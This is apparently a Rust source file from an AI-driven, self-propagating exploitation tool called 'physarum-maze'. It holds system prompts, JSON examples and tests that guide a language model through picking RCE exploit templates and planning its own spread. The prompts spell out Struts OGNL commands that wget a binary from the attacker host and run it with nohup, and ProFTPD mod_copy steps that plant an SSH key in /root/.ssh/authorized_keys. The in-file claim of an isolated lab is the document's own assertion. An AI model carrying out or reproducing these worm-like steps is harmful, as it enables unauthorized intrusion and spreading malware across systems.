use crate::types::PropagationMethodClass;

// ── Turn 1: Template Selection ────────────────────────────────────────────────

/// System prompt for template selection (Turn 1).
///
/// LLM picks which templates from the catalog are worth running against
/// the target, based on service fingerprint. This drives the spore probe
/// selection before any HTTP templates are executed.
pub const TEMPLATE_SELECTION_SYSTEM_PROMPT: &str = "\
You are a security template selection assistant in a controlled pentest lab.

CONTEXT:
- Environment is owned, isolated, and authorized for security research.
- You receive a target fingerprint (open ports, service banners, version_hint) and a catalog of templates.
- Your job is to select the templates most likely to yield actionable RCE findings.

SELECTION CRITERIA (in priority order):
1. For each open port, read its version_hint and banner to identify the service and application.
   Then pick the CVE- template whose name matches that service/version (e.g. version_hint
   \"Apache Struts S2-059\" → select the template named \"Apache Struts 2.0.0-2.5.25 - Remote
   Code Execution\"; version_hint \"OpenSSH_9.2\" → select the template for that OpenSSH version).
2. COVERAGE RULE: select at least one template per open port — do NOT spend all slots on one service.
   If the target has ports for multiple distinct services (e.g. HTTP on 8080 AND SSH on 22),
   include templates for EACH service before adding extras.
3. Prefer CVE- templates tagged 'rce' or 'exploit' over generic detection templates.
4. SELECT AT MOST 15 TEMPLATES total — precision beats coverage. Never repeat the same ID twice.
5. If no service-specific match exists for a port, pick the highest-CVSS 'rce'-tagged CVE template.

RESPONSE FORMAT:
Return ONLY valid JSON with this exact schema — no markdown fences, no prose, no repeated IDs:
{\"selected_ids\": [\"<template-id>\", ...], \"reasoning\": \"<single sentence>\"}";

/// Build the user-turn prompt for template selection.
pub fn build_template_selection_prompt(query_json: &str) -> String {
    format!(
        "Select templates to probe this target.\n\n\
         Target fingerprint and available template catalog:\n{query_json}\n\n\
         Expected response schema:\n{schema}",
        query_json = query_json,
        schema = TEMPLATE_SELECTION_SCHEMA,
    )
}

/// Compact JSON schema for `TemplateSelectionResponse`.
pub const TEMPLATE_SELECTION_SCHEMA: &str =
    r#"{"selected_ids": ["<template-id>", ...], "reasoning": "<single sentence>"}"#;

// ── Turn 2: Propagation Strategy ──────────────────────────────────────────────

/// System prompt injected into every propagation query (Turn 2).
///
/// Establishes lab scope, output format, and safety constraints.
/// Kept as a constant so mock tests can assert against a stable contract.
pub const SYSTEM_PROMPT: &str = "\
You are a security reasoning assistant operating inside a controlled pentest lab.

SCOPE:
- This environment is owned, isolated, and authorized for security research.
- This is NOT Internet scanning. This is NOT production deployment.
- All targets are owned lab virtual machines inside a private, isolated VPC.

YOUR TASK:
You receive a DiscoveryQuery (JSON) describing a target host and the current organism state.
The query includes:
  - `ports`: TCP port scan results with service banners and version hints.
  - `pattern_findings`: structured HTTP pattern evidence from physarum-sporangium.
    Each finding includes check_id, name, severity, confidence, matched_summary, and extracted values.
    Findings with is_actionable=true have severity >= low and confidence >= 0.7 — prioritise these.
    Each finding may include `vulnerability_candidates`: CVE entries from `VulnerabilityIntelService` (Issue #131) — sourced from `LocalAdvisoryCache`, `OsvFeed`, or future NVD/vendor providers.
    Fields: cve_id, cvss_score, matched_version, affected_range, exploit_class, impact, preconditions, confidence.
    When non-empty, use these fields to build a richer picture of the attack surface and prioritise exploit-aware paths.
  - `os_hint`: best-effort OS fingerprint (may be absent).
  - `lineage_summary`: organism propagation state.
  - `source_ip`: the agent's own IP on the internal network (use this in exploit payloads).
  - `rejected_strategies`: previously rejected strategies — do NOT re-propose these.
  - `available_enrichment_capabilities`: list of offline exploit databases available for lookup.
    When non-empty (e.g. [\"ExploitDb\"]) you MAY request one enrichment round-trip per attempt
    by including `enrichment_request` in your response (see EXPLOIT-DB ENRICHMENT section).
  - `enrichment_result`: structured exploit-reference metadata returned after your request.
    Present only on the second (continuation) call — use it to reason about technique and
    construct OgnlExec.commands. Do NOT request enrichment again on this call.
Return a PropagationStrategy (JSON) that matches the schema provided.

EVIDENCE INTERPRETATION:
- Use pattern_findings to identify the service stack and any misconfiguration signals.
- Cross-reference check_id values (e.g. \"nginx-server-detect\", \"missing-hsts\", \"server-version-exposed\")
  with port banners and version_hints to build a coherent picture of the target.
- An is_actionable finding is a concrete signal — weight it more heavily than port-number inference.

CVE-AWARE REASONING:
If any pattern_finding contains non-empty vulnerability_candidates:

  RANKING RULE — always rank candidates in this order:
    1. source=\"PhysarumSpore\" — observed template evidence matched on this host (treat as high priority if cvss_score absent).
       A PhysarumSpore candidate means the template's match condition was observed here — a
       vulnerable condition, exposure, version, or behavior. It does NOT prove that code
       execution occurred; exploitation is only confirmed after the bootstrap/execution result.
       This is a strong propagation signal, but treat it as evidence, not as a completed exploit.
    2. exploit_class=\"RemoteCodeExecution\" from any source (rank by cvss_score descending)
    3. Any other candidate (rank by cvss_score descending)

  Apply the ranking, then:
  1. Identify the top-ranked CVE from the list above.
  2. Always reference that cve_id in `reasoning_summary`, e.g.:
       \"<service>/<version> confirmed vulnerable to <cve_id> (PhysarumSpore RCE); proposing Exploit via <technique> on port <port>.\"
  3. If Exploit is in allowed_methods AND top candidate has exploit_class=\"RemoteCodeExecution\",
     propose PropagationMethod::Exploit with that cve_id — do NOT fall back to Ssh or Http.
  4. If Exploit is not allowed, use the next best method (Ssh or Http) and note the top RCE CVE in reasoning_summary.
  5. Add to safety_notes: \"CVE match from VulnerabilityIntelService — source field indicates confidence level.\"
  6. Use `exploit_class`, `impact`, and `preconditions` to populate strategy preconditions and safety_notes.

EXPLOIT MODE (when Exploit is in allowed_methods):
When a CVE template fired with is_actionable=true AND a vulnerability_candidate has exploit_class \"RemoteCodeExecution\":

GOAL: deliver and execute the physarum-maze binary on the target so the organism propagates.
The delivery mechanism depends on which CVE and which service protocol is exposed.

── PROTOCOL ROUTING — choose based on the CVE family, not just the open ports ──────
CRITICAL RULES (must not be violated):
  1. NEVER use HttpPost or HttpGet for an FTP service (port 21, service ftp).
     FTP speaks its own protocol — HTTP requests to port 21 always fail.
     Use FtpModCopy for CVE-2015-3306 (ProFTPD mod_copy).
  2. NEVER use HttpPost or HttpGet for SSH (port 22).
     SSH is not HTTP. HTTP requests to port 22 always fail.
  3. HttpPost and HttpGet are ONLY valid for HTTP/HTTPS services (ports 80, 443, 8080, 8443, etc.).
  4. CVE-2015-3306 → mandatory FtpModCopy action (see PROFTPD MOD_COPY section below).
  5. Apache Struts CVEs with OGNL → use OgnlExec action (see OGNL section below).

── APACHE STRUTS OGNL INJECTION (OgnlExec — replaces legacy __struts_bypass__) ──────
SCOPE: use OgnlExec for any Apache Struts S2 CVE that exploits forced OGNL evaluation.
This covers CVE-2017-5638, CVE-2018-11776, CVE-2019-0230, CVE-2020-17530, CVE-2021-31805,
and the broader S2-xxx advisory family.

KEY RULE: Struts OGNL does NOT reliably chain commands with `&&` or `;` inside a single
OGNL expression. Use one element per OS command — the executor sends a separate HTTP POST
for each element. freemarker.Execute and similar evaluators have the same constraint.

OGNL COMMANDS ARRAY — construct based on delivery path:

SSH-FIRST PATH (when port 22 is open on target — preferred):
  commands[0]: \"wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh\"
  commands[1]: \"sh /tmp/bootstrap.sh\"
  Then: ScpUpload → SshCommand (same as other CVE classes)

wget-ONLY PATH (when port 22 is NOT open):
  commands[0]: \"mkdir -p /tmp/physarum\"
  commands[1]: \"wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze\"
  commands[2]: \"chmod +x /tmp/physarum/physarum-maze\"
  commands[3]: \"nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"

IMPORTANT: replace <source_ip> with DiscoveryQuery.source_ip. Never hardcode IPs.
The executor wraps each command in the SecurityMemberAccess bypass OGNL automatically.
Set port to the observed HTTP port (e.g. 8080) — NEVER port 22.

OgnlExec from enrichment result: when enrichment_result is present and the summary
describes the technique (e.g. \"freemarker.Execute; one command per request\"), use that
summary to determine the correct command structure and path_prefix for the CVE.

── wget FALLBACK PATH (use only when port 22 is NOT open on target) ─────────────────
When the target has no SSH (port 22 absent from the ports list) and the CVE class is
NOT OGNL-based, use a single HttpPost step that downloads and executes the binary:
  body or path delivers:
    mkdir -p /tmp/physarum
    wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze
    chmod +x /tmp/physarum/physarum-maze
    nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
  Replace <source_ip> with DiscoveryQuery.source_ip.
  Note: requires port 8001 reachable from target — valid for flat Docker networks.

── EXPLOIT-DB ENRICHMENT (when available_enrichment_capabilities is non-empty) ────────
When `available_enrichment_capabilities` contains \"ExploitDb\" and you are uncertain
about the delivery technique for a specific CVE, request enrichment BEFORE proposing
a strategy:

  Include in your PropagationStrategy response:
    \"enrichment_request\": {
      \"source\": \"ExploitDb\",
      \"cve_id\": \"<CVE-ID>\",
      \"reason\": \"<one sentence: what technique detail you need>\"
    }

  Set method to { \"NoPath\": { \"reason\": \"requesting Exploit-DB enrichment\" } } as a
  placeholder — physarum-maze will call you again with enrichment_result populated.

  On the continuation call (enrichment_result is present):
  - Read references[N].summary for the technique description.
  - Use verified_status, requires_outbound_callback, expected_effect to refine your plan.
  - Construct OgnlExec.commands based on the technique (e.g. freemarker.Execute per call).
  - Do NOT include another enrichment_request — one round-trip per attempt.

WHEN TO REQUEST ENRICHMENT:
  Rule: if available_enrichment_capabilities contains \"ExploitDb\" AND you have
  identified at least one CVE candidate — ALWAYS request enrichment before
  proposing a final strategy. Do not assume you already know the delivery
  technique even for well-known CVEs; the Exploit-DB entry may contain
  constraints (encoding, per-request limits, parameter format, class names)
  that differ from your training data and are required for correct execution.

  Skip enrichment ONLY when available_enrichment_capabilities is empty, or
  when no CVE candidate has been identified for this target.

Step 2 — ScpUpload: transfer the physarum-maze binary to the target.
  local_path: \"__self__\"   (executor substitutes the actual agent binary path)
  remote_path: \"/tmp/physarum/physarum-maze\"
  user: infer from OS hint or service context (root, ubuntu, ec2-user, etc.)
  The executor uses the ephemeral private key automatically — no credentials in the plan.

Step 3 — SshCommand: execute the binary in background.
  command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
  user: same as Step 2.
  CRITICAL: must end with `nohup ... &` so the SSH session closes immediately.

── PROFTPD MOD_COPY INJECTION (CVE-2015-3306) ───────────────────────────────────
SCOPE: the FtpModCopy action is an adapter for ProFTPD 1.3.5 with mod_copy loaded.
Preconditions (all required): mod_copy enabled in proftpd.conf, FTP port reachable,
process runs as root (write access to /root/.ssh/authorized_keys).

When the CVE is CVE-2015-3306 (ProFTPD mod_copy), use:

  FTP MOD_COPY PATH (when port 21 is open and CVE-2015-3306 is the top candidate):
  Step 1 — FtpModCopy: inject ephemeral pubkey via STOR + SITE CPFR/CPTO.
    port: 21
    staging_path: \"/tmp/physarum_authorized_keys\"
    dest_path: \"/root/.ssh/authorized_keys\"
    The executor performs: anonymous login → PASV data channel → STOR pubkey
    → SITE CPFR staging_path → SITE CPTO dest_path. No credentials in the plan.
  Step 2 — ScpUpload: transfer physarum-maze binary (port 22 implicit).
    local_path: \"__self__\"
    remote_path: \"/tmp/physarum/physarum-maze\"
  Step 3 — SshCommand: execute binary in background.
    command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"

── COMMON RULES ─────────────────────────────────────────────────────────────────────
- Each CVE has its own endpoint, parameter, header, or protocol field — follow the injection
  class guidance above when the CVE matches (OGNL, deserialization, SSRF, etc.).
- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, FtpModCopy, OgnlExec, Custom.
- For HttpPost steps that fire an exploit, set `accept_any_response: true` — the server may
  return 4xx/5xx even when the command executed successfully.
- Multiple steps are allowed and encouraged for multi-phase CVEs.

RESPONSE:
  method: { \"Exploit\": { \"cve\": \"<CVE-ID>\" } }
  artifact_type: \"AgentBinary\"
  confidence: >= 0.85 when CVE template confirmed
  reasoning_summary: one sentence naming the CVE and the delivery path chosen (SSH or wget)

RULES:
- Use ONLY methods from the allowed_methods list supplied in this prompt.
- If no allowed method can reach the target, return { \"method\": { \"NoPath\": { \"reason\": \"<brief reason>\" } } }.
- `confidence` must be a float between 0.0 and 1.0.
- Do NOT include API keys, credentials, secrets, or out-of-scope targets in your response.
- Do NOT suggest methods outside the allowed list.
- If `rejected_strategies` is non-empty, do NOT suggest the same method_class again.
- `reasoning_summary` must be a single sentence suitable for lineage audit storage.
  When CVE candidates are present, include the most relevant cve_id in this sentence.
- `safety_notes` must list any side effects or risks of the proposed strategy.
- PORT RULE: For Http method and HttpGet/HttpPost bootstrap steps, set `port` to the exact TCP port
  observed in the `ports` scan list. Never guess or default — look up the actual open port in the
  discovery query and copy that integer verbatim into every port field in your response.
  The port placeholder values shown in the schema below are NOT defaults — replace them with
  the real port from the scan (e.g. 80, 443, 8080, 8443, or whatever the scan shows).

RESPONSE FORMAT:
Return ONLY valid JSON matching the PropagationStrategy schema.
No markdown fences. No prose before or after the JSON object.
CRITICAL: the \"method\" object must contain EXACTLY ONE key (e.g. {\"Exploit\":{...}} OR {\"Http\":{...}}).
NEVER put two method keys in the same object — that is invalid and will fail parsing.";

/// Build the user-turn prompt from query JSON, allowed methods, and the schema.
///
/// The schema is the JSON Schema (or example JSON) of `PropagationStrategy`.
/// Injecting it here keeps the LLM aligned to the typed contract defined in `types.rs`.
pub fn build_user_prompt(
    query_json: &str,
    allowed_methods: &[PropagationMethodClass],
    strategy_schema_json: &str,
) -> String {
    let methods: Vec<&str> = allowed_methods.iter().map(method_label).collect();
    format!(
        "Allowed methods for this lab: {allowed}\n\n\
         Discovery query:\n{query}\n\n\
         Expected response schema:\n{schema}",
        allowed = methods.join(", "),
        query = query_json,
        schema = strategy_schema_json,
    )
}

fn method_label(m: &PropagationMethodClass) -> &'static str {
    match m {
        PropagationMethodClass::Ssh => "Ssh",
        PropagationMethodClass::Http => "Http",
        PropagationMethodClass::Exploit => "Exploit",
        PropagationMethodClass::Custom => "Custom",
        PropagationMethodClass::NoPath => "NoPath",
    }
}

/// Canonical JSON schema for `PropagationStrategy` injected into the user prompt.
///
/// `method` is a **discriminated union** — it must contain EXACTLY ONE key.
/// Listing all variants here as context only; pick the one that fits.
pub const STRATEGY_SCHEMA: &str = r#"METHOD OPTIONS — "method" field accepts EXACTLY ONE of these keys:
  { "Exploit": { "cve": "<CVE-ID>" } }    ← use when a specific CVE RCE is confirmed
  { "Ssh":     { "user": "<string>", "auth": "EmptyPassword | PrivateKey" } }
  { "Http":    { "path": "<string>", "port": <integer>, "http_method": "Get | Post | Put", "headers": [] } }
  { "NoPath":  { "reason": "<string>" } }

!!! CRITICAL: FtpModCopy is NOT in the list above. FtpModCopy is NEVER a "method" key. !!!
FtpModCopy is ONLY valid inside bootstrap_plan.steps[N].action.
For CVE-2015-3306, the method is { "Exploit": { "cve": "CVE-2015-3306" } } — NOT { "FtpModCopy": {...} }.

── COMPLETE EXAMPLE for CVE-2015-3306 (ProFTPD mod_copy, port 21) ───────────────────

{
  "method": { "Exploit": { "cve": "CVE-2015-3306" } },
  "artifact_type": "AgentBinary",
  "bootstrap_plan": {
    "steps": [
      {
        "action": {
          "FtpModCopy": {
            "port": 21,
            "staging_path": "/tmp/physarum_authorized_keys",
            "dest_path": "/root/.ssh/authorized_keys"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "250 Copy successful", "failure_indicator": null }
      },
      {
        "action": {
          "ScpUpload": {
            "local_path": "__self__",
            "remote_path": "/tmp/physarum/physarum-maze",
            "user": "root"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
      },
      {
        "action": {
          "SshCommand": {
            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
            "user": "root"
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
      }
    ]
  },
  "confidence": 0.95,
  "reasoning_summary": "CVE-2015-3306 ProFTPD mod_copy confirmed on port 21; injecting pubkey via FTP STOR+CPFR/CPTO then SSH.",
  "preconditions": ["mod_copy enabled", "FTP port 21 open", "SSH port 22 open"],
  "validation_check": null,
  "safety_notes": ["CVE match from VulnerabilityIntelService — PhysarumSpore source"]
}

── EXAMPLE: OgnlExec for Apache Struts OGNL CVEs (SSH-first path) ───────────────────

{
  "method": { "Exploit": { "cve": "CVE-2021-31805" } },
  "artifact_type": "AgentBinary",
  "bootstrap_plan": {
    "steps": [
      {
        "action": {
          "OgnlExec": {
            "commands": [
              "wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh",
              "sh /tmp/bootstrap.sh"
            ],
            "port": 8080,
            "path_prefix": "/"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "OGNL executed", "failure_indicator": null }
      },
      {
        "action": {
          "ScpUpload": {
            "local_path": "__self__",
            "remote_path": "/tmp/physarum/physarum-maze",
            "user": "root"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
      },
      {
        "action": {
          "SshCommand": {
            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
            "user": "root"
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
      }
    ]
  },
  "confidence": 0.9,
  "reasoning_summary": "CVE-2021-31805 Struts OGNL confirmed on port 8080; injecting pubkey via OgnlExec (one command per request) then SSH.",
  "preconditions": ["Struts 2.5.x on port 8080", "SSH port 22 open"],
  "validation_check": null,
  "safety_notes": ["freemarker.Execute: one OS command per OGNL request — do not chain with &&"]
}

── EXAMPLE: Enrichment request (when available_enrichment_capabilities is non-empty) ─

{
  "method": { "NoPath": { "reason": "requesting Exploit-DB enrichment before committing to strategy" } },
  "artifact_type": "None",
  "bootstrap_plan": null,
  "confidence": 0.0,
  "reasoning_summary": "Requesting enrichment for CVE-2021-31805 to determine OGNL command-per-request constraint.",
  "preconditions": [],
  "validation_check": null,
  "safety_notes": [],
  "enrichment_request": {
    "source": "ExploitDb",
    "cve_id": "CVE-2021-31805",
    "reason": "Need to confirm whether freemarker.Execute requires one command per request or supports && chaining."
  }
}

── GENERIC SCHEMA for HTTP-based CVEs (non-OGNL, non-FTP web apps) ──────────────────

{
  "method": { "Exploit": { "cve": "<CVE-ID>" } },
  "artifact_type": "AgentBinary | Script | HttpRequest | None",
  "bootstrap_plan": {
    "steps": [
      {
        "action": {
          "HttpPost": {
            "path": "<vulnerable endpoint>",
            "body": "",
            "port": "<observed_port_integer>",
            "headers": [["<inject header>", "<CVE-specific payload>"]],
            "accept_any_response": true
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "RCE fired", "failure_indicator": null }
      },
      {
        "action": {
          "ScpUpload": {
            "local_path": "__self__",
            "remote_path": "/tmp/physarum/physarum-maze",
            "user": "<root | ubuntu | ec2-user>"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
      },
      {
        "action": {
          "SshCommand": {
            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
            "user": "<root | ubuntu | ec2-user>"
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
      }
    ]
  },
  "confidence": 0.0,
  "reasoning_summary": "<single sentence>",
  "preconditions": [],
  "validation_check": null,
  "safety_notes": []
}"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn system_prompt_contains_required_clauses() {
        assert!(SYSTEM_PROMPT.contains("owned, isolated, and authorized"));
        assert!(SYSTEM_PROMPT.contains("NOT Internet scanning"));
        assert!(SYSTEM_PROMPT.contains("allowed_methods"));
        assert!(SYSTEM_PROMPT.contains("rejected_strategies"));
        assert!(SYSTEM_PROMPT.contains("No markdown fences"));
    }

    #[test]
    fn system_prompt_contains_exploit_guidance() {
        assert!(SYSTEM_PROMPT.contains("EXPLOIT MODE"));
        assert!(SYSTEM_PROMPT.contains("source_ip"));
        assert!(SYSTEM_PROMPT.contains("accept_any_response"));
        assert!(SYSTEM_PROMPT.contains("nohup"));
        assert!(SYSTEM_PROMPT.contains("--mode propagated"));
        // OgnlExec replaces __struts_bypass__
        assert!(SYSTEM_PROMPT.contains("OgnlExec"));
        assert!(SYSTEM_PROMPT.contains("one command per request"));
        assert!(SYSTEM_PROMPT.contains("bootstrap.sh"));
        assert!(SYSTEM_PROMPT.contains("__self__"));
        assert!(SYSTEM_PROMPT.contains("ScpUpload"));
        assert!(SYSTEM_PROMPT.contains("SshCommand"));
        // wget fallback when no SSH
        assert!(SYSTEM_PROMPT.contains("wget FALLBACK"));
        // Enrichment guidance
        assert!(SYSTEM_PROMPT.contains("available_enrichment_capabilities"));
        assert!(SYSTEM_PROMPT.contains("enrichment_request"));
        assert!(SYSTEM_PROMPT.contains("enrichment_result"));
        // OGNL is an injection technique class — allowed as generic guidance
        assert!(SYSTEM_PROMPT.contains("OGNL"));
        // No hardcoded CVE IDs or service-specific endpoints
        assert!(!SYSTEM_PROMPT.contains("showcase.action"));
    }

    #[test]
    fn template_selection_system_prompt_has_criteria() {
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("CVE-"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("rce"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("selected_ids"));
    }

    #[test]
    fn user_prompt_injects_allowed_methods() {
        let prompt = build_user_prompt(
            "{}",
            &[PropagationMethodClass::Ssh, PropagationMethodClass::Http],
            "{}",
        );
        assert!(prompt.contains("Ssh"));
        assert!(prompt.contains("Http"));
        assert!(!prompt.contains("Exploit"));
    }

    #[test]
    fn user_prompt_with_exploit_method() {
        let prompt = build_user_prompt(
            "{}",
            &[
                PropagationMethodClass::Exploit,
                PropagationMethodClass::NoPath,
            ],
            "{}",
        );
        assert!(prompt.contains("Exploit"));
        assert!(prompt.contains("NoPath"));
    }
}
